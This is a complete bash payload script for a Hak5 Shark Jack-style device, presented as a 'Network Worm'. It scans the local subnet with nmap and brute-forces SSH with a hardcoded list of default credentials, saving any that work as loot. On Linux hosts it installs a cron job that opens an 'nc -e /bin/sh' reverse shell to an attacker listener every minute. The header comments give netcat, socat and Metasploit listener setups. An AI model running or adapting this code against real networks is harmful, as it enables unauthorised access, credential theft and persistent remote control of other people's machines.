#!/bin/bash
# Title: Network Worm
# Description: SSH Scanner + Autonomous Propagation Worm
# Author: Hackazillarex
# Version: 1.0 
#
# ====================================================================
# SETUP INSTRUCTIONS
# ====================================================================
#  VERY IMPORTANT: you need to install sshpass on the Shark Jack FIRST!
# opkg update
# opkg install sshpass
#
#
# LOOT LOCATION:
# All logs and compromised host information saved to:
# /root/loot/network_worm/
#
# Files generated:
#   - worm_session_TIMESTAMP.txt     (detailed session log)
#   - compromised_hosts.log          (list of compromised IPs)
#
# PREREQUISITES:
# 1. Ensure target device(s) have SSH enabled with weak credentials
#    Example weak credentials to test:
#      - root:root
#      - admin:admin
#      - test:test
#
# 2. On your Listener server (attacker machine), start a listener:
#
#    LISTENER COMMAND (Single Session):
#    $ nc -lvnp 4444
#
#    LISTENER COMMAND (Multiple Sessions with socat):
#    $ socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash
#
#    LISTENER COMMAND (Multiple Sessions with Metasploit):
#    $ msfconsole
#    > use exploit/multi/handler
#    > set PAYLOAD linux/x86/shell_reverse_tcp
#    > set LHOST 10.0.0.222
#    > set LPORT 4444
#    > exploit -j
#
#    This opens port 4444 waiting for reverse shell connections
#    Replace 4444 with your desired port
#
# 3. Configure the payload:
#    - Select "Configure Listener Host"
#    - Enter your Listener machine IP (e.g., 010.000.000.222)
#    - Enter listening port (e.g., 4444)
#
# 4. Start the worm:
#    - Select "Start Worm Propagation"
#    - Payload will scan network for SSH services
#    - Attempt brute force with default credentials
#    - Deploy reverse shell to compromised hosts
#    - Reverse shells connect back to your listener
#
# 5. Interact with compromised hosts:
#    When you see a connection in your listener:
#    $ whoami          # verify user
#    $ hostname        # check device
#    $ id              # check privileges
#
# NETWORK REQUIREMENTS:
# - Shark Jack must be on same network as target devices
# - All devices need IP connectivity
# - Target must have SSH port 22 open
#
# ====================================================================



setup_payload() {
  LOOT_BASE="/root/loot/network_worm"
  OUTFILE=""
  INTERFACE="eth0"
  LISTENER_HOST=""
  LISTENER_PORT="4444"
  
  LED SETUP
  mkdir -p "$LOOT_BASE"
}

log_both() {
  LOG "$1"
  echo "$1" >> "$OUTFILE"
}

initialize_menu() {
  ADD_MENU_ITEM "Configure Listener Host" "configure_listener"
  ADD_MENU_ITEM "Start Worm Propagation" "start_worm"
  ADD_MENU_ITEM "View Compromised Hosts" "view_compromised"
  ADD_MENU_ITEM "View Worm Log" "view_worm_log"
  ADD_MENU_ITEM "Stop Worm" "stop_worm"
  ADD_MENU_ITEM "Quit" "EXIT_MENU"
}

configure_listener() {
  while true; do
    LISTENER_HOST=$(TEXT_PICKER "Enter Listener Host IP" "010.000.000.222")
    
    # Validate input 
    if [[ $LISTENER_HOST =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
      break
    else
      ALERT "Invalid IP format\n\nEnter IP like: 010.000.000.222" 3 false
    fi
  done
  
  LISTENER_PORT=$(NUMBER_PICKER "Enter Listener Port" "4444")
  
  ALERT "Listener Configured\n\nHost: $LISTENER_HOST\nPort: $LISTENER_PORT" 2 false
  log_both "[+] Listener configured: $LISTENER_HOST:$LISTENER_PORT"
}

get_shark_jack_ip() {
  /sbin/ip addr show eth0 | grep "inet " | awk '{print $2}' | cut -d/ -f1
}

start_worm() {
  TS=$(date +%F_%H-%M-%S)
  OUTFILE="$LOOT_BASE/worm_session_$TS.txt"
  touch "$OUTFILE"
  
  SHARK_JACK_IP=$(get_shark_jack_ip)
  NET=$(echo $SHARK_JACK_IP | cut -d. -f1-3)
  
  if [ -z "$LISTENER_HOST" ]; then
    ALERT "Configure Listener Host First" 3 false
    return
  fi
  
  log_both "=== Network Worm v1.0 ==="
  log_both "Timestamp: $TS"
  log_both "Shark Jack IP: $SHARK_JACK_IP"
  log_both ""
  
  LOG "Network Worm: Detecting network topology..."
  LED ATTACK
  
  # Detect network size - quick ping sweep
  CREATE_SPINNER "Scanning network..."
  LIVE_COUNT=$(timeout 5 nmap -sn $NET.0/24 2>/dev/null | grep "Nmap scan report" | wc -l)
  STOP_SPINNER
  
  log_both "Live hosts detected: $LIVE_COUNT"
  
  # Decide mode based on network size
  if [ $LIVE_COUNT -le 2 ]; then
    log_both "[*] Single device mode detected (<=2 hosts)"
    SCAN_NETWORK="$NET.0/24"
  else
    log_both "[*] Full network mode (>2 hosts)"
    SCAN_NETWORK="$NET.0/24"
  fi
  
  log_both "Scan Range: $SCAN_NETWORK"
  log_both "Listener: $LISTENER_HOST:$LISTENER_PORT"
  log_both ""
  
  # Create reverse shell payload
  cat > /tmp/worm_payload.sh << 'WORM'
#!/bin/sh
LOOT_DIR="/root/loot/network_worm"
mkdir -p "$LOOT_DIR"
LISTENER_HOST="$1"
LISTENER_PORT="$2"
# Strip leading zeros from IP octets (e.g., 010.000.000.222 -> 10.0.0.222)
LISTENER_HOST=$(echo "$LISTENER_HOST" | sed 's/\.0*/./g' | sed 's/^0*//')
CURRENT_IP=$(hostname -I | awk '{print $1}')
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Compromised: $CURRENT_IP" >> "$LOOT_DIR/compromised_hosts.log"
(sleep 1; nc $LISTENER_HOST $LISTENER_PORT -e /bin/sh) &
WORM
  
  chmod +x /tmp/worm_payload.sh
  log_both "[+] Payload created"
  
  # SSH brute force with common credentials
  declare -a CREDENTIALS=(
    "root:root"
    "root:password"
    "root:12345"
    "admin:admin"
    "admin:password"
    "admin:12345"
    "test:test"
    "oracle:oracle"
    "postgres:postgres"
  )
  
  log_both ""
  log_both "=== SSH Scanning Network ==="
  log_both ""
  
  # Scan network
  CREATE_SPINNER "Scanning for SSH services..."
  
  # Make sure SHARK_JACK_IP is set
  if [ -z "$SHARK_JACK_IP" ]; then
    SHARK_JACK_IP=$(get_shark_jack_ip)
  fi
  
  # Extract IPs directly from nmap output - get IP from "Nmap scan report for X.X.X.X" lines
  LIVE_HOSTS=$(timeout 10 nmap -sn $SCAN_NETWORK 2>/dev/null | grep "Nmap scan report for" | awk '{print $NF}')
  STOP_SPINNER
  
  # Filter out Shark Jack IP
  LIVE_HOSTS=$(echo "$LIVE_HOSTS" | grep -v "^$SHARK_JACK_IP$")
  
  # Count non-empty lines
  HOST_COUNT=0
  while IFS= read -r host; do
    if [ -n "$host" ]; then
      HOST_COUNT=$((HOST_COUNT + 1))
    fi
  done <<< "$LIVE_HOSTS"
  
  log_both "[+] Found $HOST_COUNT live hosts"
  
  COMPROMISED=0
  
  # Try each host
  for host in $LIVE_HOSTS; do
    log_both ""
    log_both "Target: $host"
    
    COMPROMISED_FLAG=0
    
    for cred in "${CREDENTIALS[@]}"; do
      user=$(echo $cred | cut -d: -f1)
      pass=$(echo $cred | cut -d: -f2)
      
      # Use sshpass for SSH password authentication
      sshpass -p "$pass" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$user@$host" "whoami" > /tmp/ssh_result.txt 2>&1
      
      SSH_EXIT=$?
      
      # Check if login was successful (exit code 0)
      if [ $SSH_EXIT -eq 0 ]; then
        log_both "[+] SUCCESS: $user:$pass @ $host"
        
        # Log to compromised hosts file on Shark Jack
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] $user:$pass @ $host" >> "$LOOT_BASE/compromised_hosts.log"
        
        COMPROMISED=$((COMPROMISED + 1))
        COMPROMISED_FLAG=1
        
        # Detect OS type
        OS_TYPE=$(sshpass -p "$pass" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$user@$host" "uname -s" 2>/dev/null)
        log_both "[*] Target OS: $OS_TYPE"
        
        # Deploy worm based on OS
        log_both "[*] Deploying worm to $host..."
        
        if echo "$OS_TYPE" | grep -qi "Linux\|Darwin\|BSD"; then
          # Linux/Unix - deploy cron reverse shell
          # Strip leading zeros from Listener IP (010.000.000.222 -> 10.0.0.222)
          IFS='.' read -r o1 o2 o3 o4 <<< "$LISTENER_HOST"
          LISTENER_IP_CLEAN="$((10#$o1)).$((10#$o2)).$((10#$o3)).$((10#$o4))"
          sshpass -p "$pass" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$user@$host" "(crontab -l 2>/dev/null; echo '* * * * * nc $LISTENER_IP_CLEAN $LISTENER_PORT -e /bin/sh 2>/dev/null &') | crontab -" > /dev/null 2>&1
          log_both "[+] Worm deployed (Linux/cron) to $host"
        else
          # Windows or unknown - just log credentials, no automatic reverse shell
          log_both "[!] Windows/Unknown OS detected - cron not available"
          log_both "[!] SSH access available: $user:$pass @ $host"
        fi
        
        log_both ""
        
        # Break out of credentials loop - move to next host
        break
      fi
    done
    
    # If compromised, skip to next host
    if [ $COMPROMISED_FLAG -eq 1 ]; then
      continue
    fi
  done
  
  log_both ""
  log_both "=== Scan Complete ==="
  log_both "Hosts Scanned: $HOST_COUNT"
  log_both "Hosts Compromised: $COMPROMISED"
  log_both "Loot Location: $LOOT_BASE/"
  log_both ""
  
  LED READY
  ALERT "Worm Active\n\nScanned: $HOST_COUNT hosts\nCompromised: $COMPROMISED\n\nListener: $LISTENER_HOST:$LISTENER_PORT" 2 false
}

view_compromised() {
  if [ -f "$LOOT_BASE/compromised_hosts.log" ]; then
    SHOW_PAYLOAD_LOG "$LOOT_BASE/compromised_hosts.log"
  else
    ALERT "No compromised hosts logged yet" 2 false
  fi
}

view_worm_log() {
  if [ -f "$LOOT_BASE/worm_session_"* ]; then
    LATEST=$(ls -t $LOOT_BASE/worm_session_* 2>/dev/null | head -1)
    if [ -n "$LATEST" ]; then
      SHOW_PAYLOAD_LOG "$LATEST"
    else
      ALERT "No worm logs found" 2 false
    fi
  else
    ALERT "No worm logs found" 2 false
  fi
}

stop_worm() {
  LOG "Network Worm: Stopping..."
  
  pkill -9 nmap 2>/dev/null
  pkill -9 ssh 2>/dev/null
  rm -f /tmp/worm_payload.sh
  
  LOG "Network Worm: Stopped"
  LED FINISH
  ALERT "Network Worm Stopped" 2 false
}

setup_payload
initialize_menu
ALERT "Network Worm\nv1.0\nAutonomous Propagation\nby Hackazillarex\n← to Start" -1 false true
START_MENU

# Cleanup
pkill -9 nmap 2>/dev/null
pkill -9 ssh 2>/dev/null

LED FINISH